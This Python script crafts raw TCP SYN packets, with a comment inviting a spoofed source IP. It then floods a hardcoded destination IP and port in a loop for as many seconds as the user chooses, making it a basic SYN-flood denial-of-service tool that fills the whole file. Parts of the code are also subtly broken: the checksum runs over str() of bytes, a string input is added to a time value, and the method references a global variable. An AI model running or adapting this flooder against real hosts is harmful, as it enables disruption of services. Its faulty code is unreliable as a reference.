import socket, sys, time
from struct import *

class TCP_packet:
    def __init__(self):
        self.source_ip = ''
        self.dest_ip = ''
        self.tcp_source = 0
        self.tcp_dest = 0

        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except:
            print('error occured')
            sys.exit()

    def checksum(self, msg):
        s = 0

        for i in range(0, len(msg), 2):
            if (i+1) < len(msg):
                a = ord(msg[i])
                b = ord(msg[i+1])
                s = s + (a+(b << 8))

            elif (i+1)==len(msg):
                s += ord(msg[i])

        s = (s>>16) + (s & 0xffff);
        s = s + (s >> 16);

        s = ~s & 0xffff

        return s

    def makePacket(self, source_ip = '169.234.40.51', tcp_source = 1234, dest_ip = '18.220.82.48', tcp_dest = 8000):
        self.packet = '';
        self.source_ip = source_ip
        self.tcp_source = tcp_source
        self.dest_ip = dest_ip
        self.tcp_dest = tcp_dest

        # ip header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel will fill the correct total length
        ip_id = 54321   #Id of this packet
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0    # kernel will fill the correct checksum
        ip_saddr = socket.inet_aton ( source_ip )   #Spoof the source ip address if you want to
        ip_daddr = socket.inet_aton ( dest_ip )

        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        # the ! in the pack format string means network order
        ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

        # tcp header fields
        tcp_seq = 454
        tcp_ack_seq = 0
        tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
        #tcp flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons (5840)    #   maximum allowed window size
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)

        # the ! in the pack format string means network order
        tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)

        # pseudo header fields
        source_address = socket.inet_aton( source_ip )
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        # tcp_length = len(tcp_header) + len(user_data)
        tcp_length = len(tcp_header)

        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
        # psh = psh + tcp_header +bytes(user_data, 'utf-8');
        psh = psh + tcp_header

        tcp_check = self.checksum(str(psh))
        #print tcp_checksum

        # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
        tcp_header = pack('!HHLLBBH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)

        # final full packet - syn packets dont have any data
        self.packet = ip_header + tcp_header
        return

    def random_source_ip(self):
        return 1

    def send_socket(self):
        self.socket.sendto(tcp.packet, (self.dest_ip, self.tcp_dest))

if __name__ == "__main__":
    tcp = TCP_packet()
    tcp.makePacket()

    end = input('How much seconds do you want?')
    start = time.time()
    end = start + end

    while True:
        if time.time() > end:
            break
        tcp.send_socket()
